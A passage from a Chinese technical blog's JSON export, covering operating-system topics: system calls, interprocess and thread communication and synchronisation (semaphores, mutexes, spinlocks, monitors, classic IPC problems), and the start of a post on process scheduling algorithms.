例子以调用 read(fd, buffer, nbytes) 系统调用为例。 1count = read(fd, buffer, nbytes); read 调用包含三个参数： fd：指定读取的文件 buffer：缓冲区的指针 nbytes：读取的字节数 Reference 《Modern Operating System 4th》 Chapter 5. System Calls - https://notes.shichao.io/lkd/ch5/","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Operating System】进程 - 进程/线程间通信","date":"2019-02-13T02:23:08.000Z","path":"2019/02/13/【Operating-System】进程-线程间通信/","text":"需求一个进程（process）可以创建了多个子进程（child processes），而这些子进程又可以创建子子进程，最终，就形成了一个进程树，如下图所示： 这些相关联的子进程可能需要进行相互通讯以同步状态，这就涉及到进程间通信（Interprocess Communication, IPC）。 类似地，进程有时也需要和其他独立的进程进行通信（两个通信的进程没有父子关系）。比如，在 shell 管道（pipeline），一个进程的输出作为另一个进程的输入，这也是进程间通信。 对于线程而言，这也是类似的。因为同一个进程中的线程们共享同一块内存地址空间（address space）。因此，适用于进程间的通信机制当然也适用于线程之间。 进程间通信进程间通信用于实现进程的同步和进程的互斥。 进程的同步与互斥的区别进程的同步（synchronization）- 进程间的协作进程的同步（synchronization），是进程之间的具有协作关系，是指系统中多个进程中发生的事件存在某种时序关系，需要相互合作，共同完成一项任务。 具体地说，一个进程运行到某一点时，要求另一个伙伴进程为它提供消息，在未获得消息之前，该进程进入阻塞态，获得消息后被唤醒进入就绪态。 进程的互斥（mutual exclusion）- 进程间的竞争进程的互斥（mutual exclusion）是指进程之间具有竞争关系，即进程之间在任一时间，只能有一个进程进入临界区（critical regions）。 进程的互斥（mutual exclusion）可以看做是一种特殊的进程同步（synchronization）。 进程间通信方式进程间通信可以通过以下几种方式： 数据传输（Data transfer） 共享内存（Shared memory） 消息通信（Message comunication） 数据传输（Data transfer）管道（pipe）管道（pipe），是一种半双工的通信方式，数据只能单向流动，联系一个进程的输出和另一个进程的输入。写入在管道的尾部，读出在管道的头部。管道只能传送无格式的字节流。 在Linux上的管道分两种类型： 无名管道 PIPE（可用于父子间进程通信） 有名管道 FIFO（可用于任意两个进程间通信） 套接字（socket）套接字（socket）也是进程间的通信机制，与其它通信机制不同的是，它还可以用于不同机器间的进程通信。 共享内存（Shared memory）共享内存（Shared memory）就是映射一段可被其它进程所访问的内存，共享内存由一个进程创建，但是多个进程都可以访问。共享内存是最快的进程间通信方式（IPC），它是针对其它进程通信方式运行效率低的而专门设计的。它往往与其它通信机制。如信号量，配合使用，来实现进程间的同步和通信。 在进程间共享内存 在线程之间共享内存（全局内存） 消息通信（Message comunication）消息通信（Message comunication）具体又可细分为以下方式： 消息队列（message queue） 操作系统提供的信息通信：send()/receive() 信号（Signal） 锁（Lock）、信号量（semaphores）和管程（monitors） 消息队列（message queue）早期的 Unix 通信机制一直用的信号能够传送的信息量有限，而管道则只能传送无格式的字节流，且受缓冲区大小限制。消息队列的出现就是为了克服这些缺点。消息队列实质是一个链表（linked list），并把消息看做链表中的每一个记录，具有特定的格式。消息消费后就会被删除。 主要有两种消息队列： POSIX 消息队列 系统 V 消息队列 方式 2 被广泛应用。系统 V 消息队列是随内核持续的，随人工删除、重启机器则会被删除，要求每个消息队列都在系统范围内对应唯一的键值。 信号（signal）信号（signal）可用于进程间进行异步事件通知。比如在按下某个键、硬件异常（如除数为 0，无效的存储）、进程或用户 kill 函数等从而触发一个事件并且发送一个信号给另一个进程。一个信号的产生叫生成，接收到一个信号叫捕获。Linux 下常见的信号有 SIGKILL、SIGSTOP、SIGALRM 等等。信号是进程间通信机制中唯一的异步通信机制，一个进程不必通过任何操作来等待信号的到达，事实上，进程也不知道信号到底什么时候到达。 信号量（semaphore）信号量（semaphore）本质是一个计数器，可以用来控制多个进程对共享资源的访问。它也可以作为一种锁的机制，防止某进程正在访问临界区（共享资源）时，其它进程也访问该资源。因此它主要作为进程/线程之间同步的手段。 一些概念竞态条件（Race Conditions）在一些操作系统中，一起协同工作的进程可能共享一块存储空间，任何一个进程可以读或者写这个存储空间。这个存储空间可以是内存中的一块区域，也可以是文件系统中的一个文件。 举个例子，在多任务打印缓存处理器（print spooler）的工作场景中，当一个进程希望打印一个文件时，它会将这个文件的名称输入到一个特定的缓存处理器目录（spooler directory）中。打印机守护进程（printer daemon）会周期性地检查缓存处理器目录中是否存在任何文件名，当存在时，则打印他们，并且将这个文件名从目录中移除。 假设这个缓存处理器目录可以容纳无限个文件名，文件名索引从0开始。同时，有两个共享变量，out表示下一个需要打印的文件的索引，而in表示下一个在目录中的空位索引。这两个共享变量存储在一个文件中，这个文件可以被任何的进程所访问。 在某一时刻，空位0到3位空（这意味着这四个文件已经被打印了），空位4到6不为空（这意味着这三个文件等待着被打印）。此时，进程A和进程B都分别想添加一个文件到目录中。 进程 A 读取 in 的值（值为7），并存储到本地变量 next_free_slot 中。此时，正好进程 A 用完了它的CPU时间片，于是进程调度器将 CPU 让给进程 B 。进程 B 也读取 in 的值（值为7），并也存储到本地变量 next_free_slot 中。 进程 B 继续运行，它将要打印文件的名称存储到目录的索引为 7 的空位中，并且更新 in 的值为 8 ，此后它去执行去其他任务。 最终，当又轮到了进程 A 继续执行时，它要打印文件的名称存储到目录的索引为 7 的空位中，这个操作会抹去进程 B 之前存储在那里的文件名。紧接着，进程 A 更新 in 的值为 8 。 对于缓存处理器目录而言，整个过程始终是保持一致的，因此打印机守护进程不会提示任何错误。然而，进程 B 提交的打印任务始终不会被执行。 像这种两个以上的进程同时向共享存储区读取并且写入数据，而执行结果不可预知的情况称为竞态条件（Race Conditions），而这个共享存储区就是竞态资源（Race Resources）。 调试包含竞态条件的代码并不能解决这个问题，因为在绝大部分情况下，包含竞态条件的代码都会正常工作（体现为按预期工作），然而在运行的次数很多时，我们会得到一些奇怪的数据。 临界区（Critical Regions/ Critical Sections）为了避免竞态条件（Race Conditions），我们必须通过一个机制来阻止多个进程同时读取和写入一个竞态资源（共享数据区）。互斥（mutual exclusion）是一种解决办法，即当一个进程读写竞态资源（共享数据区）时，互斥机制会拒绝另外的进程读写这个竞态资源。 上面例子的问题就出在当进程 A 还没有完成对竞态资源（缓存处理器目录）的读写时，进程 B 也同时对这个竞态资源进行读写。 而访问竞态资源（共享数据区）的代码片段，就是临界区（Critical Regions/ Critical Sections）。 如果我们可以阻止多个进程同时进入临界区，就可以避免竞态条件（Race Conditions）。 我们用一个例子来说明多个进程进入临界区的情况。 在 T1 时刻，进程 A 进入临界区； 稍后，在 T2 时刻，进程 B 尝试进入临界区，但是失败了，因为在任一时刻我们只允许有最多一个进程处于临界区； 因此，进程 B 只能被临时挂起； 在 T3 时刻，进程 A 离开临界区，进程 B 收到通知最终进入临界区； 在 T4 时刻，进程 B 离开临界区。 忙等待下的互斥（Mutual Exclusion with Busy-waiting）在下文中，我们来讨论基于忙等待（busy-waiting）实现互斥（Mutual Exclusion）的不同方案。 禁止中断（Disabling Interrupts）在单处理器系统（single-processor）中，最简单的方法就是当进入临界区后，禁止所有进程的中断（interrupt）；当离开临界区后，再允许中断。 当禁止进程中断后，调度器就不会再进行进程切换。因此，进入临界区的进程不再需要担心其他进程写入共享数据区（因为其他进程根本没有被执行的机会）。 通常来说，这不是一个好的解决竞态条件问题的办法，因为允许用户进程（user process）禁止中断并不是一个机智的策略。如果用户进程在禁止中断后，一直都不允许中断（这个用户进程也一直处于临界区），这个用户进程最终可以无限地占用CPU。 而且，当系统是多处理器（multiprocessor）系统时，禁用正在被使用的一个处理器的中断并不能阻止其他进程在其他处理器的执行进入共享数据区。如今，越来越多的系统采用多核（multicore）CPU，因此禁止中断并不是一个有效的办法。 锁定变量（Lock Variables）每一个可以被共享的变量都对应一个锁变量，锁变量的默认值为 0 。 当一个进程进入这个被共享的变量的临界区（critical regions）时，进程需要获取这个锁变量的值，如果锁变量为 0 ，这个进程就设置这个锁变量的值为 1 ，且成功进入临界区；如果锁变量为 1 ，这个进程就等待，直到锁变量为 0 时，才能进入临界区。 因此，一个被共享的变量的锁变量若为 0 ，则意味着没有进程进入这个共享变量的临界区；若为 1 ，则意味着已经有进程进入了这个共享变量的临界区。 然而，这个机制是有潜在问题的。比如，在前面提到的多任务打印缓存处理器（print spooler）的工作场景中。假设进程 A 读取锁变量，并且得到其值为 0 ，在进程 A 设置这个锁变量为 1 之前，进程 B 恰好被调度为运行状态，进程 B 设置锁变量的值为 1。当 CPU 时间又分配给进程 A 时，进程 A 设置锁变量的值为 1 。这时，两个进程同时都进入了竞态条件。 有人可能会想提出，通过让进程 A 在设置锁变量的值为 1 时，重新读取锁变量的值（如仍为 0 ，才进行后续操作）。事实上，这仍然不能解决多进程同时进入竞态条件的问题。因为，若在进程 A 在恰好完成第二次读取锁变量的值时，进程 B 被调度为运行状态，并设置锁变量的值为 1。 总结来说，锁定变量（Lock Variables）不是线程安全的，因为“检查-占锁”这个动作不具备“原子性”。 严格转换法（Strict Alternation）Peterson 方案（Peterson’s Solution）TSL 指令（The TSL Instruction）我们来看一个在硬件层面提供帮助的方法： 1TSL RX,LOCK TSL 表示 Test and Set Lock。它会读取从内存中读取 lock 变量的值到 RX 寄存器（register）中，并设置一个非 0 值到 lock 变量的内存地址中。 这个从读取 lock 变量到寄存器到（在内存中）更新 lock 变量的操作（operation）是保证原子性（atomicity）的，即在这个 TSL 操作完成之前，其他处理器（processsor）是无法访问 lock 变量所在的内存空间的。这样的原子性是通过锁定内存总线（memory buss）实现的，目的当然是防止其他处理器读取在内存中的 lock 变量，最终多个进程同时进入临界区。 总结来说，TSL 指令从指令集支持层面保证了“检查-占锁”动作的原子性。 TSL 指令的不足在于需要让进程进入忙等待（busy waiting）。 避免忙等待（Busy-waiting - Sleep 和 Wakeup 原语背景虽然 Peterson 方案（Peterson’s Solution）和使用 TSL 或 XCHG 指令的方案都可以避免竞态条件问题，但他们都需要让进程进行忙等待（busy waiting）。即，在这些解决方案中，当一个进程进入临界区失败时，会进入一个紧密循环（tight loop），直到其成功进入临界区。 紧密循环（tight loop）不仅会浪费CPU时间，而且有时候还会衍生出新的问题。 优先级反转问题（priority inversion problem）假设当前有两个进程 H 和 L ，进程 H 具有高优先级，而进程 L 具有低优先级。调度规则为：只要进程 H 处于就绪状态时，则让其运行。 在某一时刻，进程 L 处于临界区，但是 CPU 时间片已经用完，因此进程 H 切换到了运行状态，且处于忙等待（busy waiting）状态。因为进程 H 一直在运行（处于忙等待（busy waiting）状态），因此进程 L 永远都没有机会运行（因而进程 L 将一直处于临界区）。最终，进程 H 会永远执行紧密循环（tight loop）。这也称为优先级反转问题（priority inversion problem）。 因此，在一个进程不能进入临界区时，一个更好的策略应该是阻塞式的，而不是一直浪费 CPU 时间。 Sleep 和 Wakeup 原语一个解决忙等待最简单的解决方案就是 sleep and wakeup。 sleep 是一个可以使得调用者（caller）阻塞的系统调用，而 wakeup 包含一个参数，传入要唤醒的那个进程。 生产者-消费者问题（The Producer-Consumer Problem）/有界缓冲区问题（Bounded-buffer Problem）生产者-消费者问题是利用 Sleep and Wakeup 方案提供进程间互斥（Mutual Exclusion）的一个具体实例。 两个进程共享一个大小固定的缓冲区，其中的一个进程（称为生产者），将信息放入缓冲区中；而另一个进程（称为消费者），将信息从缓冲区中取出。 事实上，包含 m 个生产者和 n 个消费者是完全有可能的，只是我们通过最小化数量突出解决方案模型本身。 当缓冲区满时，生产者进行休眠，直到有任何消费者从缓冲区中移除内容时而被唤醒；当缓冲区为空时，消费者进行休眠，直到有生产者将内容放入缓冲区时而被唤醒。 信号量机制（Semaphores）信号量（Semaphores）机制被用作进程/线程间同步，且包括两个原语（primitive）， down 和 up 。 信号量机制最初由 Dijkstra 在 1965 年提出，在他原始的论文中，他使用 P 和 V ，分别表示荷兰语中的 Proberen （try）和 Verhogen （raise, make higher）对应 down 和 up 。为了简化，我们统一采用 down 和 up 进行描述。 信号量相当于一个计数器，使用一个非负的整型变量来表示当前可用资源的数量。 假设一个进程每次只请求一个资源，当一个进程请求获取某个资源时，先要读取资源对应的信号量的值。 当信号量为 0 时， 表示当前没有资源可再被分配（因为其他进程已经占有完了所有可用资源了，因此当前进程会进入阻塞状态（blocked）。直到信号量大于 1 时，会被唤醒，且再次请求获取资源）； 当信号量大于 0 时，表示当前有资源可再被分配。因此当前进程可以成功获取到资源。这个进程通过调用 down 操作，以实现获取资源，并将信号量减一（以标识当前可用资源少了一个）。 当该进程不再使用这个资源时，这个进程需要调用 up 操作，以实现释放该资源，并将信号量加一（以标识当前可用资源多了一个）。 此后，若仍有一个或多个进程仍因等待可用资源的分配，而处于休眠状态时，内核会选择其中的一个进程以使其调用 up 操作。 从获取信号量的值、判断信号量的值（是否大于 0 ）到改变信号量的值（或者因为没有可分配的资源因而不改变信号量的值，最终进程休眠）的整个过程是一个原子操作（atomic action）。换句话说，当一个信号量操作（semaphore operation）开始后，其他进程都不能获取信号量直到这个信号量操作完成。 原子性是解决同步问题（synchronization problems）和避免竞态条件的基础。 信号量机制的实现信号量中的两个原语（primitive）， down 和 up ，可以被实现为 down 和 up 两个系统调用（system call）。 对于单处理器系统，而操作系统可以通过在获取信号量或更新信号量（或将进程调度为休眠状态）的整个过程中禁用中断（disable interrupt）。 对于多处理器系统，信号量机制需要通过锁定变量（Lock Variables） + TSL 或 XCHG 指令实现。 使用信号量解决生产者-消费者问题（The Producer-Consumer Problem）信号量的分类 Full semaphore：初始值为 0，记录当前已经被使用的资源的数量。 Empty semaphore：初始值为系统可用资源的总数，记录当前可被使用的资源的数量。 Binary semaphores （Mutex semaphores）：初始值为 1 ，且取值只能为 0 或 1 ， 二元信号量/互斥锁（Binary semaphores/ Mutexes）取值只能为 0 或 1 ，初始值为 1 ，且可以被多个进程使用，以保证在同一时间只有一个进程进入临界区的信号量机制称为二元信号量（Binary semaphores），也称为互斥锁（Mutexes）。 二元信号量/互斥锁用来实现进程间的互斥。具体来说，当一个进程要即将进入临界区时，需要调用 down ，当它刚刚离开临界区时，需要调用 up ，最终互斥（Mutual Exclusion）得到了保证。 信号量的作用信号量可以用于支持同步机制（synchronization）。而二元信号量/互斥锁（Binary semaphores/ Mutexes）是信号量的一个特例，二元信号量/互斥锁经常被用于实现多线程间的互斥（mutual exclusion）。 信号量（semaphore）是一种更高级的同步机制，mutex可以说是semaphore在仅取值0/1时的特例。Semaphore可以有更多的取值空间，用来实现更加复杂的同步，而不单单是线程间互斥。 互斥对象/互斥锁（Mutexes）互斥对象（Mutexes）可以说是信号量（semaphore）在仅取值0/1时的特例，被用于实现共享资源的互斥访问，因此也被称为互斥锁。 一个互斥对象（mutex）是一个共享变量，包含未锁定（unlocked）的和已锁定的（locked）两个枚举状态。 由于互斥对象很简单，因此可以在基于 TSL 或 XCHG 指令下的用户态（user space）实现。 互斥锁和信号量的实现都依赖 TSL 指令保证“检查-占锁”动作的原子性。 把互斥量交给程序员使用太危险，有些编程语言实现了“管程”的特性，从编译器的层面保证了访问临界区的互斥，比如 Java 的 synchronized 关键字。 FutexFutex 即 fast user space mutex，是 Linux 中实现基本锁的一个功能（feature），Futex 尽可能地避免切换到内核态，因为，一次从用户态到内核态的切换，最终再切换回用户态是非常消耗资源的。 信号量机制与互斥锁机制的区别 互斥锁机制用于进程/线程的互斥（mutual exclusion），信号量机制用于进程/线程的同步（synchronization）。 这是互斥量机制和信号量机制的根本区别，也就是互斥和同步之间的区别。 互斥：是指某一资源同时只允许一个访问者对其进行访问，具有唯一性和排它性。但互斥无法限制访问者对资源的访问顺序，即访问是无序的。 同步：是指在互斥的基础上（大多数情况），通过其它机制实现访问者对资源的有序访问。在大多数情况下，同步已经实现了互斥，特别是所有写入资源的情况必定是互斥的。少数情况是指可以允许多个访问者同时访问资源 互斥锁机制中的互斥对象取值只能为0或1，而信号量机制中的信号量值为非负整数。 互斥锁机制中的加锁和解锁必须由同一进程/线程进行操作，而信号量机制中的信号量可以由一个进程/线程释放，另一个进程/线程得到。 总结来说，互斥锁机制是信号量机制的特例。互斥锁机制只能用于对一个资源的互斥访问控制，它不能实现多个资源的多进程互斥问题。信号量机制可以实现多个同类资源的多进程互斥和同步。当信号量为二元信号量（Binary semaphores）时，则等同于互斥锁，可以完成一个资源的互斥访问。 自旋锁（Spinlock）自旋锁也是一种实现互斥（mutual exclusion）的方式，相比最经典的互斥锁（Mutex）会在因无法进入临界区而进入阻塞状态（因此互斥锁是一个阻塞锁），因而放弃CPU；而自旋锁（Spinlock）则是不断循环并测试锁的状态（紧密循环（tight loop）），这样就一直占着CPU（这个过程也称为忙等待（busy waiting））。 自旋锁是一种非阻塞式的锁，其设计的初衷是尽量减少进程的上下文切换。 当锁持有的时间短（临界区代码的执行非常快），而且不希望频繁地对进程/线程进行上下文切换时，适合使用自旋锁（而不是互斥锁）。 自旋锁与互斥锁对比如果是多核处理器，如果预计进程需要等待锁的时间很短，短到比进程进行两次上下文切换的时间还要少时，使用自旋锁相对更优。 如果是多核处理器，如果预计进程需要等待锁的时间较长，至少比进程进行两次上下文切换的时间还长，使用互斥锁则更优。 如果是单核处理器，使用自旋锁会造成额外的无用 CPU 消耗。因为，如果运行的进程发现无法获取锁，则只能不断”自旋“以获取锁的状态，直到分配给它的 CPU 时间片被用完。 而事实上，由于在同一时间只有一个进程处于运行状态，因此已经持有锁的进程，在自旋进程处于自旋的过程中，根本没有机会运行，因而锁的状态并不会发生改变。这意味着自旋进程的自旋过程只是在做无用功。而事实上，操作系统会判断当前环境是否为单核处理器，若是，则禁止进程的自旋。 管程（Monitor） 由于信号量和互斥锁可能会导致死锁（deadlock）问题，因此，在实际生产中使用信号量和互斥锁必须非常小心。 为此，Brinch Hansen 和 Hoare 提出了一个更高层（higher-level）的同步原语（primitive），以实现互斥（mutual exclusion），称为管程（Monitor）。管程（Monitor） 从本质来说是一个程序集、变量和数据结构集合。 管程要求：在任一时刻只有一个进程能在管程中处于活跃状态（active）。 具体来说，当一个进程调用管程程序时， 管程程序会首先检查当前是否有其他进程在监视器中处于活跃状态。如果有，这个进程会进入阻塞状态直到其他进程离开了监视器；如果没有其他进程正在使用监视器，这个进程就可以使用监视器。 编译器会具体负责管程机制如何具体实现（虽然通常的方法是通过互斥锁）。因此，对程序员而言，我们只需要知道管程机制能够保证互斥访问（mutual exclusion），即任一时刻只会有一个进程进入临界区。 条件变量（condition variables）Java 对管程的支持通过在方法声明（method declaration）中添加 synchronized关键字，JVM 会保证当任何一个线程执行这个方法时，其他线程不能同时执行这个 synchronized 方法。 与经典的管程有所区别的是，Java 的 synchronized 方法不存在条件变量（condition variables）。作为代替，Java 提供了 wait 和 notify 方法，以在 synchronized 方法中使用，这分别对应 sleep 和 wakeup 方法。 消息传递（Message Passing）消息传递（Message Passing）使用两个原语（primitive）send 和 receive，他们分别对应两个系统调用（system call）： 1send(destination, &amp;message); 和 1receive(source, &amp;message); 前者会发送一条消息到指定的目的地，而后者会从指定某接收一条消息（也可以指定为 ANY，则不限消息源）。当没有可达消息时，接收者会阻塞直到有消息到来。 同步屏障（Barriers）同步屏障（Barriers）也是一个同步机制（synchronization mechanism），通常服务于一组进程（而不是一对生产者-消费者类型的进程组）。 在有的应用中，我们会将程序划分为多个阶段（phase），只有当是所有进程就准备完毕可以进入下一个阶段时，所有进程才一起进入下一个阶段。 为此，我们在每个阶段的末尾引入屏障（Barrier）。当一个进程达到屏障时，则会被阻塞，直到其他进程也都全部达到屏障时才恢复就绪态，如下图所示： 潜在的进程间通信问题死锁（Deadlock）当两个进程同时占用多个被共享的资源时，就可能出现死锁。比如，A线程等待着B线程向其发送数据，而同时B线程也等待着A线程向其发送数据，此时就产生了死锁（Deadlock）。 数据不一致性（Data Inconsistency）当共享数据区同时被不同的进程修改时，数据不一致性就会发生，这也可以称为竞态条件/竞争条件（race condition）。竞斥条件是需要被避免的，否则程序会出现不按预期执行的情况。对应地，这个共享存储区被称为竞态资源（Race Resources）。 而修改竞态资源（共享数据区）的代码块，就称为临界区（critical section）。 比如，一天爸爸发现儿子的账号里只有100美元，于是决定存入50美元给儿子。而正在此时，儿子正在取钱，他打算取20美元（取钱后账号应该剩80美元）。 由于爸爸和儿子的操作同时进行，而且进行操作账号时没锁（Lock），最终可能出现他们操作之后，账号的余额为150美元。 使用汇编语言来描述这个过程： 因此，我们需要引入互斥（mutual exclusion）机制，以避免多个进程同时进入临界区，最终避免数据不一致性（Data Inconsistency）的发生。 互斥机制从本质来说，是一种同步（synchronization）机制。 经典的 IPC 问题哲学家就餐问题（The Dining Philosophers Problem）问题：5个哲学家坐在一个圆桌，每个哲学家都有一份意大利面，而意大利面非常滑，因此每个哲学家需要两个叉子来吃它。在每两份意大利面之间都有一个叉子，如下所示： 每位哲学家的生活只包括两个状态，吃或者思考。当一个哲学家足够饿时，他会尝试获得他左边和右边的叉子，一次拿一个（以任何的顺序）。如果他成功获得了两个叉子，他就会吃一会儿，然后放下叉子，继续思考。 问题在于，如何设计一个程序使得每个哲学家在任何时间都可以做他想做的，而不会被相互阻塞。 读者-写者问题（The Readers and Writers Problem）在一个航班预定系统中，多个进程可以同时从数据库中获取信息，但是当一个进程正在写入数据库时，所有的进程都不能进行信息读取。 总结进程互斥机制（Mutual Exclusion Facilities）为了解决上面的死锁或数据不一致问题，我们需要引入同步机制， 基于硬件的解决方案 禁止中断（Disabling Interrupts）：仅仅适用于单 CPU 系统，不适用于多 CPU 或多核系统； TSL 指令（The TSL Instruction）：TSL 表示 Test and Set Lock，TSL 指令从指令集支持层面保证了“检查-占锁”动作的原子性。TSL 指令的不足在于需要让进程进入忙等待（busy waiting）。 XCHG 指令 基于软件的解决方案 LockOne锁 LockTwo算法 Peterson 算法 Bakery 算法 Dekker 算法 各种同步机制的实现方法 信号量（Semaphores）：基于 TSL 或 XCHG 指令实现。 互斥锁（mutexes）：为信号量的特例，即二元信号量（Binary semaphores）。 基于 TSL 或 XCHG 指令实现； 实现了多进程/线程的互斥（mutual exclusion）访问，即在任一时刻，只能有一个进程/线程进入临界区状态（critical section）。 自旋锁（Spinlock）：也是一种实现互斥（mutual exclusion）的方式，相比于互斥锁（Mutex）会在因无法进入临界区而进入阻塞状态，因而放弃CPU，自旋锁则是不断循环并测试锁的状态（紧密循环（tight loop）），这样就一直占着CPU，这个过程也称为忙等待（busy waiting）。 管程（Monitor）：基于 TSL 或 XCHG 指令实现。 Reference 《Modern Operating System 4th》 互斥锁，同步锁，临界区，互斥量，信号量，自旋锁之间联系是什么？ - https://www.zhihu.com/question/39850927 linux 中进程间6种通信方式 - http://www.syyong.com/linux/6-communication-modes-between-processes-in-Linux.html 读写自旋锁详解 - https://www.ibm.com/developerworks/cn/linux/l-cn-rwspinlock1/index.html 操作系统原理（Operating Systems） - https://www.coursera.org/learn/os-pku/home/welcome","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Operating System】进程 - 进程/线程调度","date":"2019-02-10T08:34:25.000Z","path":"2019/02/10/【Operating-System】进程-线程调度/","text":"进程调度的原理需要进程调度（Process Scheduling）的理由很简单，即充分利用计算机系统中的CPU资源，让计算机系统能够多快好省地完成我们让它做的各种任务。 具体来说，当只有一个单核的CPU时，若同时有多个进程处于就绪状态，操作系统必须决定哪一个进程占用CPU，而进程调度器（Process Scheduler）正是负责这一工作，对应采用的调度方法就称为调度算法（scheduling algorithm）。 进程调度器希望进程们能够高效（高的吞吐量–throughput）、及时（低延迟–latency）、公平（fairness）地使用CPU。 而调度器需要设计不同的调度算法（Scheduling algorithm）来选择进程，这体现了进程调度的策略，同时还需进一步通过进程的上下文切换（context switch）来真正完成进程切换，这体现了进程调度的机制。 总体上说，我们需要在何时进行调度（调度的时机）、是否在内核执行的任意位置进行调度（调度的方式）、如何选择“合适”的进程执行调度（调度策略/调度算法）、如何完成进程切换（上下文切换）、如何评价选择的合理性（进程调度的指标）。了解上述细节，也就可以说是了解了进程调度。 当引入了线程的概念后，真正占用CPU执行的最小单元就变成了线程（而进程是资源调度的最小单元）。因此，线程与进程的调度机制是类似的，只是实现线程调度机制的实体，变成了线程调度器（thread scheduler）。 进程调度的时机进程调度发生的时机（也称为调度点）与进程的状态变化有直接的关系。回顾进程状态变化图，我们可以看到进程调度的时机直接与进程在运行态&lt;–&gt;退出态/就绪态/阻塞态的转变时机相关。简而言之，引起进程调度的时机可归结为以下几类： 正在执行的进程执行完毕（Terminated），需要选择新的就绪进程执行。 正在执行的进程调用相关阻塞式系统调用（包括与I/O操作，同步互斥操作等相关的系统调用）导致需等待某事件发生或资源可用，从而切换为阻塞态（Blocked）。 正在执行的进程主动调用放弃CPU的系统调用，从而进入就绪态（Ready），并被放到就绪队列中。 等待事件发生或资源可用的进程进入就绪队列，对应从阻塞态回到就绪态，并可参与到调度中。 正在执行（Running）的进程的时间片已经用完，切换为就绪态（Ready），且被重新放到就绪队列中。 在执行完系统调用后准备返回用户进程前的时刻，可调度选择一新用户进程执行。 就绪队列中某进程的优先级高于当前执行进程的优先级，从而也将引发进程调度。 进程调度的方式通常，存在两种进程调度方式： 非抢占式调度算法（nonpreemptive scheduling algorithm） 可抢占式调度算法（preemptive scheduling algorithm） 非抢占式调度算法（nonpreemptive scheduling algorithm）非抢占式调度算法（nonpreemptive scheduling algorithm）会选择一个进程进行运行，直到该进程运行结束或进入阻塞状态。 可抢占式调度算法（preemptive scheduling algorithm）可抢占式调度算法（preemptive scheduling algorithm）通常基于某个指标，比如截止时间（deadline）、运行时间（burst time）或进程执行优先级（priority）等，我们通常笼统地称其为优先级。 根据抢占的时机，又细分为： 基于时钟中断的抢占式优先权调度算法 立即抢占的优先权调度算法 基于时钟中断的抢占式优先权调度算法当新进程到达后，如果该进程的优先级别高于当前正在执行的进程的优先级，新进程并不立即抢占当前进程的CPU，而是等到时钟中断到来时，调度程序才剥夺当前进程的执行，并将CPU分配给新到的高优先权的进程。 立即抢占的优先权调度算法在这种调度策略中，要求操作系统具有快速响应外部时间中断的能力。 一旦出现外部中断，且新进程的优先级高于当前正在运行的进程，只要当前进程未处于临界区，便立即剥夺当前进程的执行，并把CPU分配给请求中断的紧迫任务。 在分时系统（time-sharing system）中，通常存在CPU时间片的概念。 因此，当优先级较高的进程在用完其CPU时间片后，仍然需要将时间片让给优先级较低的进程。这意味着，即使采取抢占式地进程调度方式，优先级较低的进程仍有被执行的可能（而不是直到优先级较高的进程在完成执行完成后，才将CPU时间片让给优先级较低的进程）。 进程调度的指标（metrics）不同的进程调度算法具有不同的特征，为此需要建立衡量一个算法的基本指标。一般而言，衡量和比较各种进程调度算法性能的主要因素如下所示： CPU利用率（CPU utilization）：CPU是计算机系统中的稀缺资源，所以应在有具体任务的情况下尽可能使CPU保持忙，从而使得CPU资源利用率最高。 吞吐量（throughput）：CPU运行时的工作量大小是以每单位时间所完成的进程数目来描述的，即称为吞吐量。 周转时间（turnaround time）：指从进程被创建到进程被完成所经过的时间，这期间包括了由于各种因素导致的等待时间，具体包括因等待I/O操作完成而发生的进程阻塞，处于就绪态并在就绪队列中排队，在处理机上运行所花时间。 等待时间（waiting time）：即进程在就绪队列中等待所花的时间总和（进程从进入就绪队列至获得CPU）。因此衡量一个调度算法的简单方法就是统计进程在就绪队列上的等待时间。 响应时间（response time）：指从发出一个命令到得到结果所经过的时间。在交互式桌面计算机系统中，用户希望响应时间越快越好，但这常常要以牺牲吞吐量为代价。 这些指标其实是相互有冲突的，响应时间短也就意味着在相关事件产生后，操作系统需要迅速进行进程切换，让对应的进程尽快响应产生的事件，从而导致进程调度与切换的开销增大，这会降低系统的吞吐量。 调度器的类型长期调度器（Long-term scheduling）### 进程调度算法（algorithm）进程调度算法的分类（Categories of Scheduling Algorithms）显然，在不同的场景中，需要的调度算法是不同的。这些场景可以被分类为： 批处理（batch）系统 交互型（interactive）系统 实时（real-time）系统 批处理（batch）系统批处理（batch）系统仍然被广泛地运用于工资结算、库存、银行利息计算等等周期性任务（periodic tasks）中。 由于不需要快速地响应用户的请求，非抢占式的调度算法或包含长执行周期的抢占式调度算法通常在批处理系统中被使用。由于尽可能地减少了进程切换，因而获得较高的执行效率（CPU利用率）。 交互型（interactive）系统在包含用户交互（user interaction）的系统中，抢占式的调度算法通常被使用，这样做可以防止一个进程长时间占用CPU，从而交互可以获得很快的响应。 实时（real time）系统在包含实时处理（real time）的系统中，抢占式的调度算法有时不会被需要，因为进程们不会长时间地占用CPU。 在实时系统中，任务通常会有执行截止时间（deadline），即任务必须在某一个时间节点前完成，否则就没有执行的意义了。举个例子，一台计算机控制一个设备（device）并使其以一定的周期定时产生监测数据，如果没有及时地采集这个监测数据，则意味着数据的丢失。因此，在新的数据产生之前（对应的截止时间），及时地采集监测数据非常重要。 批处理系统（batch systems）中的调度算法先来先服务调度算法（FCFS: first-come, first-served）先来先服务调度算法（FCFS: first-come, first-served）是一种最简单的非抢占式调度算法。 它基于队列的特性，早就绪的进程排在就绪队列（ready queue）的前面，迟就绪的进程排在就绪队列的后面。 先来先服务调度算法总是把当前处于就绪队列之首的那个进程优先切换为运行状态。也就是说，它只考虑进程进入就绪队列的先后，而不考虑它占用CPU的时间长短及其他因素。 换言之，先进入就绪队列的进程，先分配CPU。一旦一个进程占有了CPU，它就一直运行下去（甚至运行一天），直到该进程结束（terminated）或者被阻塞时（因为等待某事件发生而不能继续运行），才释放CPU并进行上下文切换（context switch）。当一个被阻塞的进程变为就绪状态后，它会被放入就绪队列的末端，等待被执行。 讨论由于长任务可以长期占有CPU，因此CPU的利用率可以很高，然而，吞吐量可能会很低，而且周期时间、等待时间和响应时间可能也会很长。 